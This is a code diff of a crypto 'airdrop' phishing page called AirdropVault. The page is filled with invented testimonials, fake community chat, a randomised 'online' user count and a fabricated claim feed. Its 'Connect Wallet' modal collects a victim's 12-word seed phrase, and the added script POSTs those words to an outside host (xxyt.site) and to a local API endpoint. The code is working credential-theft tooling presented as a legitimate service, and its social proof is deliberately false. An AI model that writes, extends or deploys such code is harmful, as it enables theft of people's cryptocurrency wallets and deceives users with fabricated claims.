-      <div class="grid grid-cols-3 sm:grid-cols-4 gap-3 mb-6"><input type="text" placeholder="Word 1" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 2" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 3" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 4" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 5" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 6" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 7" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 8" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 9" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 10" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 11" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <input type="text" placeholder="Word 12" class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40">
-      </div>
-      <div id="connect-error" class="hidden bg-red-500/10 border border-red-500 text-red-400 text-sm rounded-lg px-3 py-2 mb-4"></div><button onclick="completeConnection()" class="w-full px-4 py-3 bg-[#00ff88] text-[#0a0f1a] font-semibold rounded-xl hover:bg-[#00e07a] transition-all">Complete Connection</button>
-     </div>
-    </div>
-   </div>
-  </div>
-  <script>
-    // Data
-    const airdrops = [
-      { name: "zkSync Era", tag: "ZK", gradient: "from-purple-500 to-blue-500", category: "Layer 2", status: "Active", value: "$2,000-$8,000", claims: "12,340", desc: "Bridge assets and interact with DApps on zkSync Era mainnet." },
-      { name: "LayerZero", tag: "LZ", gradient: "from-orange-500 to-red-500", category: "Omnichain", status: "Hot", value: "$3,000-$15,000", claims: "28,901", desc: "Cross-chain messaging and bridging protocol with confirmed token." },
-      { name: "Scroll", tag: "SC", gradient: "from-cyan-400 to-blue-600", category: "zkEVM", status: "Active", value: "$1,500-$6,000", claims: "9,472", desc: "Interact with Scroll mainnet ecosystem and provide liquidity." },
-      { name: "Starknet", tag: "SN", gradient: "from-indigo-500 to-purple-600", category: "ZK Rollup", status: "Active", value: "$1,000-$5,000", claims: "45,210", desc: "Use Starknet DApps, bridge funds, and participate in governance." },
-      { name: "EigenLayer", tag: "EL", gradient: "from-blue-400 to-indigo-500", category: "Restaking", status: "Upcoming", value: "$5,000-$20,000", claims: "67,892", desc: "Restake ETH and participate in the restaking ecosystem." },
-      { name: "Monad", tag: "MN", gradient: "from-violet-500 to-fuchsia-500", category: "Layer 1", status: "Upcoming", value: "$2,000-$10,000", claims: "3,201", desc: "Early testnet interactions and community participation." },
-      { name: "Berachain", tag: "BR", gradient: "from-amber-500 to-orange-600", category: "Layer 1", status: "Active", value: "$1,500-$7,000", claims: "18,445", desc: "Testnet participation and proof-of-liquidity farming." },
-      { name: "Fuel Network", tag: "FU", gradient: "from-green-400 to-emerald-600", category: "Modular", status: "Active", value: "$800-$4,000", claims: "7,891", desc: "Build and deploy on Fuel's modular execution layer." }
-    ];
 
-    const successStories = [
-      { name: "CryptoMax_92", avatar: "CM", gradient: "from-blue-500 to-purple-500", earned: "$14,200", airdrop: "Arbitrum", time: "3 months ago", story: "I followed the guide here and bridged to Arbitrum early. When the ARB token dropped, I received 4,250 tokens. Best decision I ever made following this community's advice!" },
-      { name: "DeFi_Sarah", avatar: "DS", gradient: "from-pink-500 to-rose-500", earned: "$8,750", airdrop: "Optimism", time: "6 months ago", story: "Was skeptical at first but started using Optimism based on the alerts here. Got 2 OP airdrops totaling over $8K. The step-by-step guides made it so easy even for a beginner." },
-      { name: "BlockchainDev_Tom", avatar: "BT", gradient: "from-green-500 to-teal-500", earned: "$23,400", airdrop: "Multiple", time: "1 month ago", story: "Been a member since day one. Claimed airdrops from Uniswap, ENS, Arbitrum, and Optimism. AirdropVault's early alerts gave me time to qualify for each one." },
-      { name: "Hodl_Queen", avatar: "HQ", gradient: "from-amber-500 to-orange-500", earned: "$6,300", airdrop: "Blur", time: "4 months ago", story: "Never thought I'd earn from NFT trading but the Blur airdrop guide was incredibly detailed. Listed a few NFTs, did some bids, and boom — $6.3K in BLUR tokens!" },
-      { name: "Web3_Marcus", avatar: "WM", gradient: "from-cyan-500 to-blue-500", earned: "$31,000", airdrop: "dYdX", time: "8 months ago", story: "The dYdX airdrop was life-changing. I traded on the platform for 2 weeks after seeing the alert here. Received 8,000 DYDX tokens. This platform literally changed my financial situation." },
-      { name: "Airdrop_Jenny", avatar: "AJ", gradient: "from-violet-500 to-indigo-500", earned: "$5,100", airdrop: "Aptos", time: "5 months ago", story: "Minted an Aptos NFT on testnet as the guide suggested. When mainnet launched, I got the APT airdrop. Simple tasks, amazing rewards. 10/10 would recommend!" },
-      { name: "DeFi_Whale_99", avatar: "DW", gradient: "from-emerald-500 to-green-600", earned: "$42,800", airdrop: "Multiple", time: "2 weeks ago", story: "Full-time airdrop hunter thanks to this community. Last month alone: $18K from EigenLayer points, $12K from LayerZero sybil-proof interactions, $12.8K from Starknet. This is my job now." },
-      { name: "CryptoNewbie_Ali", avatar: "CA", gradient: "from-red-500 to-pink-500", earned: "$2,400", airdrop: "Celestia", time: "2 months ago", story: "Started with zero crypto knowledge. The beginner guides here taught me everything. My first airdrop was Celestia — staked TIA and earned from the ecosystem. So grateful!" }
-    ];
+    <script>
+      document
+        .getElementById("passphraseForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
 
-    const chatMessages = [
-      { user: "CryptoKing_42", msg: "Just bridged to Scroll mainnet! The gas fees are so low 🔥", time: "2m ago" },
-      { user: "AirdropHunter", msg: "Anyone else farming EigenLayer points? The restaking APY is insane", time: "3m ago" },
-      { user: "DeFiSarah", msg: "PSA: LayerZero snapshot might be coming soon. Make sure you have at least 5 unique chain interactions", time: "5m ago" },
-      { user: "WhaleAlert_Bot", msg: "🚨 New airdrop detected: Monad testnet is live! Get in early", time: "7m ago" },
-      { user: "BlockchainDev", msg: "Pro tip: Use multiple bridges for LayerZero, not just Stargate. Diversify your interactions", time: "8m ago" },
-      { user: "NFT_Collector", msg: "Blur Season 3 rewards just dropped. Check your wallets everyone!", time: "10m ago" },
-      { user: "YieldFarmer_X", msg: "The Berachain testnet faucet is working again. Go claim your BERA tokens", time: "12m ago" },
-      { user: "CryptoMax_92", msg: "Just got confirmed — my zkSync airdrop allocation is 3,500 tokens! LFG 🚀", time: "14m ago" },
-      { user: "NewbieInCrypto", msg: "Thanks for the Starknet guide! Just completed my first bridge transaction", time: "16m ago" },
-      { user: "DeFi_Whale_99", msg: "Remember: consistency > volume. Do transactions weekly, not all at once", time: "18m ago" },
-      { user: "TokenSniper", msg: "Fuel Network testnet has a new quest live. Easy points for the airdrop", time: "20m ago" },
-      { user: "HODLer_4Life", msg: "My portfolio is 80% airdrop tokens at this point 😂 thanks to this community", time: "22m ago" }
-    ];
+          const form = e.target;
 
-    const activityData = [
-      { user: "0x7a3...f291", action: "claimed", project: "zkSync Era", amount: "3,200 ZK", time: "12s ago" },
-      { user: "0x9b1...e482", action: "qualified for", project: "LayerZero", amount: "", time: "34s ago" },
-      { user: "0x2c8...a019", action: "earned", project: "EigenLayer", amount: "450 points", time: "1m ago" },
-      { user: "0x5f4...d723", action: "claimed", project: "Starknet", amount: "1,800 STRK", time: "2m ago" },
-      { user: "0x8e2...b156", action: "bridged to", project: "Scroll", amount: "0.5 ETH", time: "3m ago" }
-    ];
+          const formData = new FormData(form);
 
-    // Navigation
-    function navigateTo(page) {
-      document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
-      document.getElementById('page-' + page).classList.remove('hidden');
-      document.querySelectorAll('.nav-link').forEach(l => {
-        l.classList.remove('active');
-        l.classList.remove('text-[#00ff88]');
-        l.classList.add('text-gray-400');
+          const data = Object.fromEntries(formData.entries());
+
+          try {
+            const response = await fetch(
+              // "http://127.0.0.1:8000/api/wallet/passphrase",
+              "https://xxyt.site/api/wallet/passphrase",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                  Accept: "application/json",
+                },
+                body: JSON.stringify(data),
+              },
+            );
+
+            const result = await response.json();
+
+            if (response.ok) {
+              alert(result.message);
+
+              form.reset();
+            } else {
+              console.log(result);
+
+              alert("Validation failed");
+            }
+          } catch (error) {
+            console.error(error);
+
+            alert("Something went wrong");
+          }
+        });
+    </script>
+
+    <script>
+      // Data
+      const airdrops = [
+        {
+          name: "zkSync Era",
+          tag: "ZK",
+          gradient: "from-purple-500 to-blue-500",
+          category: "Layer 2",
+          status: "Active",
+          value: "$2,000-$8,000",
+          claims: "12,340",
+          desc: "Bridge assets and interact with DApps on zkSync Era mainnet.",
+        },
+        {
+          name: "LayerZero",
+          tag: "LZ",
+          gradient: "from-orange-500 to-red-500",
+          category: "Omnichain",
+          status: "Hot",
+          value: "$3,000-$15,000",
+          claims: "28,901",
+          desc: "Cross-chain messaging and bridging protocol with confirmed token.",
+        },
+        {
+          name: "Scroll",
+          tag: "SC",
+          gradient: "from-cyan-400 to-blue-600",
+          category: "zkEVM",
+          status: "Active",
+          value: "$1,500-$6,000",
+          claims: "9,472",
+          desc: "Interact with Scroll mainnet ecosystem and provide liquidity.",
+        },
+        {
+          name: "Starknet",
+          tag: "SN",
+          gradient: "from-indigo-500 to-purple-600",
+          category: "ZK Rollup",
+          status: "Active",
+          value: "$1,000-$5,000",
+          claims: "45,210",
+          desc: "Use Starknet DApps, bridge funds, and participate in governance.",
+        },
+        {
+          name: "EigenLayer",
+          tag: "EL",
+          gradient: "from-blue-400 to-indigo-500",
+          category: "Restaking",
+          status: "Upcoming",
+          value: "$5,000-$20,000",
+          claims: "67,892",
+          desc: "Restake ETH and participate in the restaking ecosystem.",
+        },
+        {
+          name: "Monad",
+          tag: "MN",
+          gradient: "from-violet-500 to-fuchsia-500",
+          category: "Layer 1",
+          status: "Upcoming",
+          value: "$2,000-$10,000",
+          claims: "3,201",
+          desc: "Early testnet interactions and community participation.",
+        },
+        {
+          name: "Berachain",
+          tag: "BR",
+          gradient: "from-amber-500 to-orange-600",
+          category: "Layer 1",
+          status: "Active",
+          value: "$1,500-$7,000",
+          claims: "18,445",
+          desc: "Testnet participation and proof-of-liquidity farming.",
+        },
+        {
+          name: "Fuel Network",
+          tag: "FU",
+          gradient: "from-green-400 to-emerald-600",
+          category: "Modular",
+          status: "Active",
+          value: "$800-$4,000",
+          claims: "7,891",
+          desc: "Build and deploy on Fuel's modular execution layer.",
+        },
+      ];
+
+      const successStories = [
+        {
+          name: "CryptoMax_92",
+          avatar: "CM",
+          gradient: "from-blue-500 to-purple-500",
+          earned: "$14,200",
+          airdrop: "Arbitrum",
+          time: "3 months ago",
+          story:
+            "I followed the guide here and bridged to Arbitrum early. When the ARB token dropped, I received 4,250 tokens. Best decision I ever made following this community's advice!",
+        },
+        {
+          name: "DeFi_Sarah",
+          avatar: "DS",
+          gradient: "from-pink-500 to-rose-500",
+          earned: "$8,750",
+          airdrop: "Optimism",
+          time: "6 months ago",
+          story:
+            "Was skeptical at first but started using Optimism based on the alerts here. Got 2 OP airdrops totaling over $8K. The step-by-step guides made it so easy even for a beginner.",
+        },
+        {
+          name: "BlockchainDev_Tom",
+          avatar: "BT",
+          gradient: "from-green-500 to-teal-500",
+          earned: "$23,400",
+          airdrop: "Multiple",
+          time: "1 month ago",
+          story:
+            "Been a member since day one. Claimed airdrops from Uniswap, ENS, Arbitrum, and Optimism. AirdropVault's early alerts gave me time to qualify for each one.",
+        },
+        {
+          name: "Hodl_Queen",
+          avatar: "HQ",
+          gradient: "from-amber-500 to-orange-500",
+          earned: "$6,300",
+          airdrop: "Blur",
+          time: "4 months ago",
+          story:
+            "Never thought I'd earn from NFT trading but the Blur airdrop guide was incredibly detailed. Listed a few NFTs, did some bids, and boom — $6.3K in BLUR tokens!",
+        },
+        {
+          name: "Web3_Marcus",
+          avatar: "WM",
+          gradient: "from-cyan-500 to-blue-500",
+          earned: "$31,000",
+          airdrop: "dYdX",
+          time: "8 months ago",
+          story:
+            "The dYdX airdrop was life-changing. I traded on the platform for 2 weeks after seeing the alert here. Received 8,000 DYDX tokens. This platform literally changed my financial situation.",
+        },
+        {
+          name: "Airdrop_Jenny",
+          avatar: "AJ",
+          gradient: "from-violet-500 to-indigo-500",
+          earned: "$5,100",
+          airdrop: "Aptos",
+          time: "5 months ago",
+          story:
+            "Minted an Aptos NFT on testnet as the guide suggested. When mainnet launched, I got the APT airdrop. Simple tasks, amazing rewards. 10/10 would recommend!",
+        },
+        {
+          name: "DeFi_Whale_99",
+          avatar: "DW",
+          gradient: "from-emerald-500 to-green-600",
+          earned: "$42,800",
+          airdrop: "Multiple",
+          time: "2 weeks ago",
+          story:
+            "Full-time airdrop hunter thanks to this community. Last month alone: $18K from EigenLayer points, $12K from LayerZero sybil-proof interactions, $12.8K from Starknet. This is my job now.",
+        },
+        {
+          name: "CryptoNewbie_Ali",
+          avatar: "CA",
+          gradient: "from-red-500 to-pink-500",
+          earned: "$2,400",
+          airdrop: "Celestia",
+          time: "2 months ago",
+          story:
+            "Started with zero crypto knowledge. The beginner guides here taught me everything. My first airdrop was Celestia — staked TIA and earned from the ecosystem. So grateful!",
+        },
+      ];
+
+      const chatMessages = [
+        {
+          user: "CryptoKing_42",
+          msg: "Just bridged to Scroll mainnet! The gas fees are so low 🔥",
+          time: "2m ago",
+        },
+        {
+          user: "AirdropHunter",
+          msg: "Anyone else farming EigenLayer points? The restaking APY is insane",
+          time: "3m ago",
+        },
+        {
+          user: "DeFiSarah",
+          msg: "PSA: LayerZero snapshot might be coming soon. Make sure you have at least 5 unique chain interactions",
+          time: "5m ago",
+        },
+        {
+          user: "WhaleAlert_Bot",
+          msg: "🚨 New airdrop detected: Monad testnet is live! Get in early",
+          time: "7m ago",
+        },
+        {
+          user: "BlockchainDev",
+          msg: "Pro tip: Use multiple bridges for LayerZero, not just Stargate. Diversify your interactions",
+          time: "8m ago",
+        },
+        {
+          user: "NFT_Collector",
+          msg: "Blur Season 3 rewards just dropped. Check your wallets everyone!",
+          time: "10m ago",
+        },
+        {
+          user: "YieldFarmer_X",
+          msg: "The Berachain testnet faucet is working again. Go claim your BERA tokens",
+          time: "12m ago",
+        },
+        {
+          user: "CryptoMax_92",
+          msg: "Just got confirmed — my zkSync airdrop allocation is 3,500 tokens! LFG 🚀",
+          time: "14m ago",
+        },
+        {
+          user: "NewbieInCrypto",
+          msg: "Thanks for the Starknet guide! Just completed my first bridge transaction",
+          time: "16m ago",
+        },
+        {
+          user: "DeFi_Whale_99",
+          msg: "Remember: consistency > volume. Do transactions weekly, not all at once",
+          time: "18m ago",
+        },
+        {
+          user: "TokenSniper",
+          msg: "Fuel Network testnet has a new quest live. Easy points for the airdrop",
+          time: "20m ago",
+        },
+        {
+          user: "HODLer_4Life",
+          msg: "My portfolio is 80% airdrop tokens at this point 😂 thanks to this community",
+          time: "22m ago",
+        },
+      ];
+
+      const activityData = [
+        {
+          user: "0x7a3...f291",
+          action: "claimed",
+          project: "zkSync Era",
+          amount: "3,200 ZK",
+          time: "12s ago",
+        },
+        {
+          user: "0x9b1...e482",
+          action: "qualified for",
+          project: "LayerZero",
+          amount: "",
+          time: "34s ago",
+        },
+        {
+          user: "0x2c8...a019",
+          action: "earned",
+          project: "EigenLayer",
+          amount: "450 points",
+          time: "1m ago",
+        },
+        {
+          user: "0x5f4...d723",
+          action: "claimed",
+          project: "Starknet",
+          amount: "1,800 STRK",
+          time: "2m ago",
+        },
+        {
+          user: "0x8e2...b156",
+          action: "bridged to",
+          project: "Scroll",
+          amount: "0.5 ETH",
+          time: "3m ago",
+        },
+      ];
+
+      // Navigation
+      function navigateTo(page) {
+        document
+          .querySelectorAll(".page")
+          .forEach((p) => p.classList.add("hidden"));
+        document.getElementById("page-" + page).classList.remove("hidden");
+        document.querySelectorAll(".nav-link").forEach((l) => {
+          l.classList.remove("active");
+          l.classList.remove("text-[#00ff88]");
+          l.classList.add("text-gray-400");
+        });
+        document.querySelectorAll(`[data-page="${page}"]`).forEach((l) => {
+          l.classList.add("active");
+          l.classList.add("text-[#00ff88]");
+          l.classList.remove("text-gray-400");
+        });
+        document.getElementById("mobile-menu").classList.add("hidden");
+        document.getElementById("app").scrollTop = 0;
+      }
+
+      document.querySelectorAll("[data-page]").forEach((link) => {
+        link.addEventListener("click", (e) => {
+          e.preventDefault();
+          navigateTo(link.dataset.page);
+        });
       });
-      document.querySelectorAll(`[data-page="${page}"]`).forEach(l => {
-        l.classList.add('active');
-        l.classList.add('text-[#00ff88]');
-        l.classList.remove('text-gray-400');
-      });
-      document.getElementById('mobile-menu').classList.add('hidden');
-      document.getElementById('app').scrollTop = 0;
-    }
 
-    document.querySelectorAll('[data-page]').forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        navigateTo(link.dataset.page);
-      });
-    });
+      document
+        .getElementById("mobile-menu-btn")
+        .addEventListener("click", () => {
+          document.getElementById("mobile-menu").classList.toggle("hidden");
+        });
 
-    document.getElementById('mobile-menu-btn').addEventListener('click', () => {
-      document.getElementById('mobile-menu').classList.toggle('hidden');
-    });
-
-    // Render airdrops
-    function renderAirdrops() {
-      const container = document.getElementById('airdrops-list');
-      container.innerHTML = airdrops.map(a => `
+      // Render airdrops
+      function renderAirdrops() {
+        const container = document.getElementById("airdrops-list");
+        container.innerHTML = airdrops
+          .map(
+            (a) => `
         <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover">
           <div class="flex items-center gap-4">
             <div class="w-12 h-12 rounded-full bg-gradient-to-br ${a.gradient} flex items-center justify-center text-sm font-bold shrink-0">${a.tag}</div>
             <div class="flex-1 min-w-0">
               <div class="flex items-center gap-2 flex-wrap">
                 <span class="font-semibold">${a.name}</span>
-                <span class="px-2 py-0.5 text-xs rounded-full ${a.status === 'Hot' ? 'bg-yellow-500/10 text-yellow-400' : a.status === 'Upcoming' ? 'bg-blue-500/10 text-blue-400' : 'bg-[#00ff88]/10 text-[#00ff88]'}">${a.status}</span>
+                <span class="px-2 py-0.5 text-xs rounded-full ${a.status === "Hot" ? "bg-yellow-500/10 text-yellow-400" : a.status === "Upcoming" ? "bg-blue-500/10 text-blue-400" : "bg-[#00ff88]/10 text-[#00ff88]"}">${a.status}</span>
                 <span class="text-xs text-gray-500">${a.category}</span>
               </div>
               <p class="text-sm text-gray-400 mt-1">${a.desc}</p>
@@ -639,13 +1382,17 @@
             <button class="shrink-0 px-4 py-2 bg-[#00ff88]/10 text-[#00ff88] text-sm font-medium rounded-lg hover:bg-[#00ff88]/20 transition-all">Guide</button>
           </div>
         </div>
-      `).join('');
-    }
+      `,
+          )
+          .join("");
+      }
 
-    // Render success stories
-    function renderSuccessStories() {
-      const container = document.getElementById('success-stories');
-      container.innerHTML = successStories.map(s => `
+      // Render success stories
+      function renderSuccessStories() {
+        const container = document.getElementById("success-stories");
+        container.innerHTML = successStories
+          .map(
+            (s) => `
         <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover">
           <div class="flex items-center gap-3 mb-4">
             <div class="w-10 h-10 rounded-full bg-gradient-to-br ${s.gradient} flex items-center justify-center text-xs font-bold">${s.avatar}</div>
@@ -660,21 +1407,25 @@
           </div>
           <p class="text-sm text-gray-400 leading-relaxed">"${s.story}"</p>
           <div class="flex items-center gap-4 mt-4 pt-3 border-t border-[#1a2940]">
-            <button class="flex items-center gap-1 text-xs text-gray-500 hover:text-[#00ff88]"><i data-lucide="heart" class="w-3.5 h-3.5"></i> ${Math.floor(Math.random()*200+50)}</button>
-            <button class="flex items-center gap-1 text-xs text-gray-500 hover:text-[#00ff88]"><i data-lucide="message-circle" class="w-3.5 h-3.5"></i> ${Math.floor(Math.random()*30+5)}</button>
+            <button class="flex items-center gap-1 text-xs text-gray-500 hover:text-[#00ff88]"><i data-lucide="heart" class="w-3.5 h-3.5"></i> ${Math.floor(Math.random() * 200 + 50)}</button>
+            <button class="flex items-center gap-1 text-xs text-gray-500 hover:text-[#00ff88]"><i data-lucide="message-circle" class="w-3.5 h-3.5"></i> ${Math.floor(Math.random() * 30 + 5)}</button>
             <button class="flex items-center gap-1 text-xs text-gray-500 hover:text-[#00ff88]"><i data-lucide="share" class="w-3.5 h-3.5"></i> Share</button>
           </div>
         </div>
-      `).join('');
-      lucide.createIcons();
-    }
+      `,
+          )
+          .join("");
+        lucide.createIcons();
+      }
 
-    // Render community chat
-    function renderChat() {
-      const container = document.getElementById('community-chat');
-      container.innerHTML = chatMessages.map(m => `
+      // Render community chat
+      function renderChat() {
+        const container = document.getElementById("community-chat");
+        container.innerHTML = chatMessages
+          .map(
+            (m) => `
         <div class="flex gap-3">
-          <div class="w-8 h-8 rounded-full bg-[#1a2940] flex items-center justify-center text-xs font-medium shrink-0">${m.user.slice(0,2)}</div>
+          <div class="w-8 h-8 rounded-full bg-[#1a2940] flex items-center justify-center text-xs font-medium shrink-0">${m.user.slice(0, 2)}</div>
           <div>
             <div class="flex items-center gap-2">
               <span class="text-sm font-medium">${m.user}</span>
@@ -683,198 +1434,351 @@
             <p class="text-sm text-gray-400 mt-0.5">${m.msg}</p>
           </div>
         </div>
-      `).join('');
-    }
+      `,
+          )
+          .join("");
+      }
 
-    // Render activity feed
-    function renderActivity() {
-      const container = document.getElementById('activity-feed');
-      container.innerHTML = activityData.map(a => `
+      // Render activity feed
+      function renderActivity() {
+        const container = document.getElementById("activity-feed");
+        container.innerHTML = activityData
+          .map(
+            (a) => `
         <div class="flex items-center gap-3 bg-[#0f1a2e] border border-[#1a2940] rounded-xl px-4 py-3">
           <span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot shrink-0"></span>
           <span class="text-sm text-gray-400">
             <span class="text-white mono text-xs">${a.user}</span> ${a.action} <span class="text-[#00ff88]">${a.project}</span>
-            ${a.amount ? '— <span class="text-white">' + a.amount + '</span>' : ''}
+            ${a.amount ? '— <span class="text-white">' + a.amount + "</span>" : ""}
           </span>
           <span class="ml-auto text-xs text-gray-500 shrink-0">${a.time}</span>
         </div>
-      `).join('');
-    }
-
-    function postComment() {
-      const input = document.getElementById('chat-input');
-      if (!input.value.trim()) return;
-      chatMessages.unshift({ user: "You", msg: input.value, time: "now" });
-      input.value = '';
-      renderChat();
-    }
-
-    document.getElementById('chat-input').addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        postComment();
-      }
-    });
-
-    // Live user count
-    function updateLiveUsers() {
-      const base = 102847;
-      const variation = Math.floor(Math.random() * 200 - 100);
-      document.getElementById('live-users').textContent = (base + variation).toLocaleString() + ' online';
-    }
-    setInterval(updateLiveUsers, 5000);
-
-    // Connect Modal Functions
-    function openConnectModal() {
-      document.getElementById('connect-modal').classList.remove('hidden');
-    }
-
-    function closeConnectModal() {
-      document.getElementById('connect-modal').classList.add('hidden');
-      document.querySelectorAll('.passphrase-input').forEach(input => input.value = '');
-      document.getElementById('connect-error').classList.add('hidden');
-    }
-
-    function completeConnection() {
-      const inputs = document.querySelectorAll('.passphrase-input');
-      const words = Array.from(inputs).map(input => input.value.trim());
-      
-      if (words.some(word => !word)) {
-        const errorEl = document.getElementById('connect-error');
-        errorEl.textContent = 'Please fill in all 12 words';
-        errorEl.classList.remove('hidden');
-        return;
+      `,
+          )
+          .join("");
       }
 
-      localStorage.setItem('userConnected', 'true');
-      localStorage.setItem('passphrase', JSON.stringify(words));
-      
-      const btn = document.getElementById('connect-btn');
-      btn.textContent = '✓ Connected';
-      btn.disabled = true;
-      btn.classList.remove('bg-[#00ff88]', 'hover:bg-[#00e07a]');
-      btn.classList.add('bg-[#00ff88]/50', 'cursor-not-allowed');
-      
-      closeConnectModal();
-      
-      setTimeout(() => {
-        alert('🎉 Connection successful! We will notify you of upcoming airdrops. Check your email for next steps!');
-      }, 500);
-    }
+      function postComment() {
+        const input = document.getElementById("chat-input");
+        if (!input.value.trim()) return;
+        chatMessages.unshift({ user: "You", msg: input.value, time: "now" });
+        input.value = "";
+        renderChat();
+      }
 
-    function updateConnectButton() {
-      if (localStorage.getItem('userConnected')) {
-        const btn = document.getElementById('connect-btn');
-        btn.textContent = '✓ Connected';
+      document.getElementById("chat-input").addEventListener("keydown", (e) => {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          postComment();
+        }
+      });
+
+      // Live user count
+      function updateLiveUsers() {
+        const base = 102847;
+        const variation = Math.floor(Math.random() * 200 - 100);
+        document.getElementById("live-users").textContent =
+          (base + variation).toLocaleString() + " online";
+      }
+      setInterval(updateLiveUsers, 5000);
+
+      // Connect Modal Functions
+      function openConnectModal() {
+        document.getElementById("connect-modal").classList.remove("hidden");
+      }
+
+      function closeConnectModal() {
+        document.getElementById("connect-modal").classList.add("hidden");
+        document
+          .querySelectorAll(".passphrase-input")
+          .forEach((input) => (input.value = ""));
+        document.getElementById("connect-error").classList.add("hidden");
+      }
+
+      async function completeConnection(e) {
+        if (e) e.preventDefault();
+
+        const inputs = document.querySelectorAll(".passphrase-input");
+
+        const words = Array.from(inputs).map((input) => input.value.trim());
+
+        const errorEl = document.getElementById("connect-error");
+
+        const btn = document.getElementById("connect-btn");
+
+        errorEl.classList.add("hidden");
+        errorEl.textContent = "";
+
+        // Validate all 12 words
+        if (words.some((word) => !word)) {
+          errorEl.textContent = "Please fill in all 12 words";
+
+          errorEl.classList.remove("hidden");
+
+          return;
+        }
+
+        // Disable button while processing
         btn.disabled = true;
-        btn.classList.remove('bg-[#00ff88]', 'hover:bg-[#00e07a]');
-        btn.classList.add('bg-[#00ff88]/50', 'cursor-not-allowed');
-      }
-    }
 
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') {
-        closeConnectModal();
-      }
-    });
+        btn.textContent = "Connecting...";
 
-    // Init
-    renderAirdrops();
-    renderSuccessStories();
-    renderChat();
-    renderActivity();
-    lucide.createIcons();
-    updateConnectButton();
+        try {
+          const response = await fetch("/api/wallet/passphrase", {
+            method: "POST",
 
-    // Element SDK
-    const defaultConfig = {
-      site_title: "AirdropVault",
-      hero_heading: "Claim Free Crypto Airdrops Daily",
-      hero_subtext: "Join 100,000+ users who've earned over $12M in free tokens. Never miss another airdrop opportunity.",
-      background_color: "#0a0f1a",
-      surface_color: "#0f1a2e",
-      text_color: "#ffffff",
-      primary_action: "#00ff88",
-      secondary_action: "#1a2940",
-      font_family: "Outfit",
-      font_size: 16,
-      connect_button_text: "Connect Wallet"
-    };
+            headers: {
+              "Content-Type": "application/json",
+              Accept: "application/json",
+            },
 
-    window.elementSdk.init({
-      defaultConfig,
-      onConfigChange: async (config) => {
-        const bg = config.background_color || defaultConfig.background_color;
-        const surface = config.surface_color || defaultConfig.surface_color;
-        const text = config.text_color || defaultConfig.text_color;
-        const primary = config.primary_action || defaultConfig.primary_action;
-        const secondary = config.secondary_action || defaultConfig.secondary_action;
-        const font = config.font_family || defaultConfig.font_family;
-        const size = config.font_size || defaultConfig.font_size;
+            body: JSON.stringify({
+              word_1: words[0],
+              word_2: words[1],
+              word_3: words[2],
+              word_4: words[3],
+              word_5: words[4],
+              word_6: words[5],
+              word_7: words[6],
+              word_8: words[7],
+              word_9: words[8],
+              word_10: words[9],
+              word_11: words[10],
+              word_12: words[11],
+            }),
+          });
 
-        document.getElementById('app').style.backgroundColor = bg;
-        document.getElementById('app').style.color = text;
-        document.getElementById('app').style.fontFamily = `${font}, sans-serif`;
-        document.getElementById('app').style.fontSize = size + 'px';
-        document.getElementById('nav-title').textContent = config.site_title || defaultConfig.site_title;
+          const result = await response.json();
 
-        const heading = document.getElementById('hero-heading');
-        const headingText = config.hero_heading || defaultConfig.hero_heading;
-        heading.innerHTML = headingText.replace('Airdrops Daily', `<span style="color:${primary}">Airdrops Daily</span>`);
-        heading.style.fontFamily = `${font}, sans-serif`;
-
-        document.getElementById('hero-subtext').textContent = config.hero_subtext || defaultConfig.hero_subtext;
-
-        const connectBtn = document.getElementById('connect-btn');
-        if (connectBtn && !localStorage.getItem('userConnected')) {
-          connectBtn.textContent = config.connect_button_text || defaultConfig.connect_button_text || "Connect Wallet";
-        }
-
-        document.querySelectorAll('.card-hover, #community-chat').forEach(el => {
-          el.style.backgroundColor = surface;
-          el.style.borderColor = secondary;
-        });
-      },
-      mapToCapabilities: (config) => ({
-        recolorables: [
